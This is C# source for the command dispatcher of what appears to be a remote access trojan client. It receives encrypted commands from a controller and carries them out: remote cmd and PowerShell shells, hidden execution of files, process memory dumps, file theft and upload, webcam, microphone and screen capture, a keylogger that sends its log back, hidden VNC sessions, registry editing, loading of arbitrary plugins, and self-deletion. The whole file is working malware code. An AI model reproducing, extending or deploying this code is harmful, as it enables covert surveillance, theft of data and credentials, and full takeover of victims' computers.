using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using MessagePack;

namespace Client.HandlePacket
{
    internal class Packet
    {
        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Helper.Helper.Aes.Decrypt((byte[])data));
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "shell":
                        {
                            HandleShell.StarShell();
                            break;
                        }

                    case "shellWriteInput":
                        {
                            HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                            break;
                        }

                    case "shellClose":
                        {

                            HandleShell.ShellClose();
                            break;
                        }

                    case "powershell":
                        {
                            HandlePowershell.StarShell();
                            break;
                        }

                    case "powershellWriteInput":
                        {
                            HandlePowershell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                            break;
                        }

                    case "powershellClose":
                        {
                            HandlePowershell.ShellClose();
                            break;
                        }

                    case "process":
                        {
                            HandleProcess.ProcessList();
                            break;
                        }

                    case "processKill":
                        {
                            HandleProcess.ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                            break;
                        }

                    case "processDump":
                        {
                            HandleProcess.Minidump(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                            break;
                        }

                    case "getDrivers":
                        {
                            try
                            {
                                HandleFile.GetDrivers();
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error( ex.Message);
                            }

                            break;
                        }

                    case "getPath":
                        {
                            try
                            {
                                HandleFile.GetPath(
                                    unpack_msgpack.ForcePathObject("Path").AsString);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "deleteFile":
                        {
                            try
                            {
                                var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                File.Delete(fullPath);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error( ex.Message);
                            }

                            break;
                        }

                    case "execute":
                        {
                            try
                            {
                                var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                Process.Start(fullPath);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "executeHidden":
                        {
                            try
                            {
                                var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                var process = new Process();
                                process.StartInfo.FileName = fullPath;
                                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process.Start();
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "executeNewDesktop":
                        {
                            try
                            {
                                var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                HandleFile.ExecuteNewDesktop(fullPath);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "createFolder":
                        {
                            try
                            {
                                var fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
                                if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "deleteFolder":
                        {
                            try
                            {
                                var fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
                                if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "copyFile":
                        {
                            try
                            {
                                foreach (var item in HandleFile.Copies)
                                    if (item.HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                    {
                                        item.FileCopy = unpack_msgpack.ForcePathObject("File").AsString;
                                        item.PathCopy = unpack_msgpack.ForcePathObject("Path").AsString;
                                        break;
                                    }

                                var copy = new HandleFile.Copy
                                {
                                    HWID = unpack_msgpack.ForcePathObject("HWID").AsString,
                                    FileCopy = unpack_msgpack.ForcePathObject("File").AsString,
                                    PathCopy = unpack_msgpack.ForcePathObject("Path").AsString
                                };
                                HandleFile.Copies.Add(copy);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "pasteFile":
                        {
                            try
                            {
                                HandleFile.Copy filecopy = null;
                                foreach (var item in HandleFile.Copies)
                                    if (item.HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                        filecopy = item;
                                var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                if (fullPath.Length > 0 && filecopy != null)
                                {
                                    var filesArray = filecopy.FileCopy.Split(new[] { "-=>" }, StringSplitOptions.None);
                                    foreach (var t in filesArray)
                                        try
                                        {
                                            if (t.Length > 0)
                                            {
                                                if (unpack_msgpack.ForcePathObject("IO").AsString == "copy")
                                                    File.Copy(t, Path.Combine(fullPath, Path.GetFileName(t)), true);
                                                else
                                                    File.Move(t, Path.Combine(fullPath, Path.GetFileName(t)));
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            HandleFile.Error(ex.Message);
                                        }

                                    var pathArray = filecopy.PathCopy.Split(new[] { "-=>" }, StringSplitOptions.None);
                                    foreach (var t in pathArray)
                                        try
                                        {
                                            if (t.Length > 0)
                                            {
                                                if (unpack_msgpack.ForcePathObject("IO").AsString == "copy")
                                                    HandleFile.CopyDirectory(t, Path.Combine(fullPath, Path.GetFileName(t)));
                                                else
                                                    Directory.Move(t, Path.Combine(fullPath, Path.GetFileName(t)));
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            HandleFile.Error( ex.Message);
                                        }

                                    foreach (var item in HandleFile.Copies)
                                        if (item.HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                        {
                                            item.FileCopy = null;
                                            item.PathCopy = null;
                                        }
                                }
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "renameFile":
                        {
                            try
                            {
                                File.Move(unpack_msgpack.ForcePathObject("File").AsString,
                                    unpack_msgpack.ForcePathObject("NewName").AsString);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error(ex.Message);
                            }

                            break;
                        }

                    case "renameFolder":
                        {
                            try
                            {
                                Directory.Move(unpack_msgpack.ForcePathObject("Folder").AsString,
                                    unpack_msgpack.ForcePathObject("NewName").AsString);
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error( ex.Message);
                            }

                            break;
                        }

                    case "zip":
                        {
                            try
                            {
                                if (!HandleFile.CheckForSevenZip())
                                    HandleFile.Error(
                                        "7-zip hasn't installed.");
                                if (unpack_msgpack.ForcePathObject("Zip").AsString == "true")
                                {
                                    var sb = new StringBuilder();
                                    var location = new StringBuilder();
                                    foreach (var path in unpack_msgpack.ForcePathObject("Path").AsString
                                                 .Split(new[] { "-=>" }, StringSplitOptions.None))
                                        if (!(path == null || path == ""))
                                        {
                                            sb.Append($"-ir!\"{path}\" ");
                                            if (location.Length == 0) location.Append(Path.GetFullPath(path));
                                        }

                                    HandleFile.ZipCommandLine(sb.ToString(), true, location.ToString());
                                }
                                else
                                {
                                    HandleFile.ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, false, "");
                                }
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error( ex.Message);
                            }

                            break;
                        }

                    case "install7Zip":
                        {
                            try
                            {
                                if (File.Exists(HandleFile.ZipPath))
                                    HandleFile.Error(
                                        "7-zip already installed.");
                                if (!Directory.Exists(Path.GetTempPath() + "\\7-Zip"))
                                    Directory.CreateDirectory(Path.GetTempPath() + "\\7-Zip");
                                File.WriteAllBytes(HandleFile.ZipPath, unpack_msgpack.ForcePathObject("File").GetAsBytes());
                                File.WriteAllBytes(Path.Combine(Path.GetTempPath(), "7-Zip\\7z.dll"), unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                                HandleFile.Error( "7-zip installed.");
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error( ex.Message);
                            }

                            break;
                        }

                    case "uploadFile":
                        {
                            try
                            {
                                var fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
                                if (File.Exists(fullPath))
                                {
                                    File.Delete(fullPath);
                                    Thread.Sleep(500);
                                }

                                unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                                Program.TCP_Socket.Log(fullPath+ "uploaded" );
                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error( ex.Message);
                            }

                            break;
                        }

                    case "downloadFile":
                        {
                            try
                            {
                                if (new FileInfo(unpack_msgpack.ForcePathObject("File").AsString).Length >= 2147483647)
                                {
                                    HandleFile.Error( "Don't support files larger than 2GB.");
                                }

                                string file = unpack_msgpack.ForcePathObject("File").AsString;
                                string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                HandleFile handleFile = new HandleFile();
                                handleFile.DownnloadFile(file, dwid);

                            }
                            catch (Exception ex)
                            {
                                HandleFile.Error( ex.Message);
                            }
                            break;
                        }

                    case "capture":
                        {

                            if (HandleDesktop.IsOk) return;

                            HandleDesktop.IsOk = true;
                            HandleDesktop.CaptureAndSend(
                                Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger),
                                Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
                            break;
                        }

                    case "mouseClick":
                        {
                            Native.mouse_event((int)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
                            break;
                        }

                    case "mouseMove":
                        {
                            var position = new Point((int)unpack_msgpack.ForcePathObject("X").AsInteger,
                                (int)unpack_msgpack.ForcePathObject("Y").AsInteger);
                            Cursor.Position = position;
                            break;
                        }

                    case "captureStop":
                        {
                            HandleDesktop.IsOk = false;

                            break;
                        }

                    case "keyboardClick":
                        {
                            var keyDown = Convert.ToBoolean(unpack_msgpack.ForcePathObject("keyIsDown").AsString);
                            var key = Convert.ToByte(unpack_msgpack.ForcePathObject("key").AsInteger);
                            Native.keybd_event(key, 0, keyDown ? 0x0000 : (uint)0x0002, UIntPtr.Zero);
                            break;
                        }

                    case "webcamGet":
                        {
                            HandleCamera.GetWebcams();
                            break;
                        }

                    case "webcamStart":
                        {
                            if (HandleCamera.IsOk) return;

                            HandleCamera.IsOk = true;
                            var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                            HandleCamera.FinalVideo = new VideoCaptureDevice(
                                videoCaptureDevices[(int)unpack_msgpack.ForcePathObject("List").AsInteger]
                                    .MonikerString);
                            HandleCamera.Quality = (int)unpack_msgpack.ForcePathObject("Quality").AsInteger;
                            HandleCamera.FinalVideo.NewFrame += HandleCamera.CaptureRun;
                            HandleCamera.FinalVideo.VideoResolution =
                                HandleCamera.FinalVideo.VideoCapabilities[
                                    unpack_msgpack.ForcePathObject("List").AsInteger];
                            Debug.WriteLine(unpack_msgpack.ForcePathObject("List").AsInteger);
                            HandleCamera.FinalVideo.Start();
                            break;
                        }

                    case "webcamStop":
                        {
                            HandleCamera.CaptureDispose();
                            break;
                        }

                    case "network":
                        {
                            HandleNetwork.NetstatList();
                            break;
                        }

                    case "networkKill":
                        {
                            HandleNetwork.Kill(
                                Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                            break;
                        }

                    case "device":
                        {
                            HandleDevice.GetAllDevices();
                            break;
                        }

                    case "deviceSet":
                        {
                            var utf8 = Encoding.UTF8.GetBytes(unpack_msgpack.ForcePathObject("ID").AsString);

                            var strencode = Encoding.UTF8.GetString(utf8);
                            foreach (var temporaryDeviceInfo in HandleDevice.EnumerateDevices())
                                if (temporaryDeviceInfo.GetProperty(Native.SPDRP.SPDRP_HARDWAREID) == strencode)
                                {
                                    HandleDevice.EnableDevice(temporaryDeviceInfo.HDevInfo, temporaryDeviceInfo.DeviceData,
                                        Convert.ToBoolean(unpack_msgpack.ForcePathObject("Enable").AsString));
                                    HandleDevice.GetAllDevices();
                                }

                            break;
                        }

                    case "codedom":
                        {
                            HandlePlugin.PluginLoad(unpack_msgpack.ForcePathObject("Name").AsString, unpack_msgpack.ForcePathObject("assemblyBytes").GetAsBytes());
                            break;
                        }

                    case "LoadRegistryKey":
                        {
                            var RootKeyName = unpack_msgpack.ForcePathObject("RootKeyName").AsString;
                            HandleRegEdit.LoadKey(RootKeyName);
                            break;
                        }
                    case "CreateRegistryKey":
                        {
                            var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                            HandleRegEdit.CreateKey(ParentPath);
                            break;
                        }
                    case "DeleteRegistryKey":
                        {
                            var KeyName = unpack_msgpack.ForcePathObject("KeyName").AsString;
                            var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                            HandleRegEdit.DeleteKey(KeyName, ParentPath);
                            break;
                        }
                    case "RenameRegistryKey":
                        {
                            var OldKeyName = unpack_msgpack.ForcePathObject("OldKeyName").AsString;
                            var NewKeyName = unpack_msgpack.ForcePathObject("NewKeyName").AsString;
                            var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                            HandleRegEdit.RenameKey(OldKeyName, NewKeyName, ParentPath);
                            break;
                        }
                    case "CreateRegistryValue":
                        {
                            var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                            var Kindstring = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                            HandleRegEdit.CreateValue(KeyPath, Kindstring);
                            break;
                        }
                    case "DeleteRegistryValue":
                        {
                            var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                            var ValueName = unpack_msgpack.ForcePathObject("ValueName").AsString;
                            HandleRegEdit.DeleteValue(KeyPath, ValueName);
                            break;
                        }
                    case "RenameRegistryValue":
                        {
                            var OldValueName = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                            var NewValueName = unpack_msgpack.ForcePathObject("NewValueName").AsString;
                            var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                            HandleRegEdit.RenameValue(OldValueName, NewValueName, KeyPath);
                            break;
                        }
                    case "ChangeRegistryValue":
                        {
                            var Valuebyte = unpack_msgpack.ForcePathObject("Value").GetAsBytes();
                            var Value = HandleRegEdit.DeSerializeRegValueData(Valuebyte);
                            HandleRegEdit.ChangeValue(Value, unpack_msgpack.ForcePathObject("KeyPath").AsString);
                            break;
                        }
                    case "voice":
                        {
                            HandleVoice.OpenAudio(44100, 16, 2);
                            break;
                        }

                    case "voiceClose":
                        {
                            HandleVoice.Dispose();
                            break;
                        }

                    case "keylogger":
                        {
                            if (HandleKeylogger.offline)
                            {
                                HandleKeylogger.online = true;
                                break;
                            }
                            if (!HandleKeylogger.online)
                            {
                                HandleKeylogger.online = true;
                                HandleKeylogger.Run();
                            }
                            break;
                        }

                    case "keyloggerStop":
                        {
                            HandleKeylogger.online = false;
                            if (!HandleKeylogger.offline) HandleKeylogger.Stop();

                            break;
                        }

                    case "keyloggerSave":
                        {
                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "keyLoggerSave";
                            msgpack.ForcePathObject("log").AsString = File.ReadAllText(HandleKeylogger.path,Encoding.UTF8);
                            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                            break;
                        }

                    case "hvnc":
                        {
                            var thread = new Thread(() =>
                            {
                                if (HandleHVNC.IsOk) return;
                                if (!HandleHVNC.inited) HandleHVNC.HandleHVNCInit();

                                HandleHVNC.IsOk = true;
                                HandleHVNC.CaptureAndSend();
                            });
                            thread.SetApartmentState(ApartmentState.STA);
                            thread.IsBackground = true;
                            thread.Start();

                            break;
                        }

                    case "hvncMouse":
                        {
                            switch (unpack_msgpack.ForcePathObject("Button").AsString)
                            {
                                case "2":
                                    {
                                        HandleHVNC.PostClickLD((int)unpack_msgpack.ForcePathObject("X").AsInteger,
                                            (int)unpack_msgpack.ForcePathObject("Y").AsInteger);
                                        break;
                                    }
                                case "8":
                                    {
                                        HandleHVNC.PostClickRD((int)unpack_msgpack.ForcePathObject("X").AsInteger,
                                            (int)unpack_msgpack.ForcePathObject("Y").AsInteger);

                                        break;
                                    }
                                case "4":
                                    {
                                        HandleHVNC.PostClickLU((int)unpack_msgpack.ForcePathObject("X").AsInteger,
                                            (int)unpack_msgpack.ForcePathObject("Y").AsInteger);

                                        break;
                                    }
                                case "16":
                                    {
                                        HandleHVNC.PostClickRU((int)unpack_msgpack.ForcePathObject("X").AsInteger,
                                            (int)unpack_msgpack.ForcePathObject("Y").AsInteger);

                                        break;
                                    }
                            }


                            break;
                        }

                    case "hvncMouseMove":
                        {
                            HandleHVNC.PostMove((int)unpack_msgpack.ForcePathObject("X").AsInteger,
                                    (int)unpack_msgpack.ForcePathObject("Y").AsInteger);
                            break;
                        }

                    case "hvncKeyboard":
                        {
                            HandleHVNC.PostKeyDown(unpack_msgpack.ForcePathObject("key").AsInteger);
                            break;
                        }

                    case "hvncCommand":
                        {
                            Native.SetThreadDesktop(HandleHVNC.hNewDesktop);
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "min":
                                    {
                                        HandleHVNC.MinTop();
                                        break;
                                    }
                                case "max":
                                    {
                                        HandleHVNC.RestoreMaxTop();
                                        break;
                                    }
                                case "close":
                                    {
                                        HandleHVNC.CloseTop();
                                        break;
                                    }
                            }

                            Native.SetThreadDesktop(HandleHVNC.hOldDesktop);

                            break;
                        }

                    case "hvncStop":
                        {
                            HandleHVNC.StopHVNC();
                            break;
                        }

                    case "thumbnail":
                        {
                            if (!HandleThumbnail.isOn)
                            {
                                HandleThumbnail.isOn = true;
                                HandleThumbnail.Start();
                            }
                            break;
                        }

                    case "thumbnailStop":
                        {
                            HandleThumbnail.isOn = false;

                            break;
                        }

                    case "option":
                        {
                            try
                            {
                                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                                {
                                    case "Stop":
                                        {
                                            HandleOption.Stop();
                                            break;
                                        }
                                    case "Disconnnect":
                                        {
                                            HandleOption.Disconnnect();
                                            break;
                                        }
                                    case "Restart":
                                        {
                                            HandleOption.Restart();
                                            break;
                                        }
                                    case "Update":
                                        {
                                            HandleOption.Update(unpack_msgpack.ForcePathObject("File").GetAsBytes());
                                            break;
                                        }
                                    case "DeleteSelf":
                                        {
                                            HandleOption.DeleteSelf();
                                            break;
                                        }
                                    case "ReBoot":
                                        {
                                            HandleOption.ReBoot();
                                            break;
                                        }
                                    case "PowerOff":
                                        {
                                            HandleOption.PowerOff();
                                            break;
                                        }
                                    case "LogOut":
                                        {
                                            HandleOption.LogOut();
                                            break;
                                        }
                                }
                            }
                            catch (Exception ex)
                            {
                                Program.TCP_Socket.Log(ex.Message);
                            }

                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Source + " : " + ex.Message);
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Message").AsString = ex;
            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string log)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Log";
            msgpack.ForcePathObject("Message").AsString = log;
            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
        }
    }
}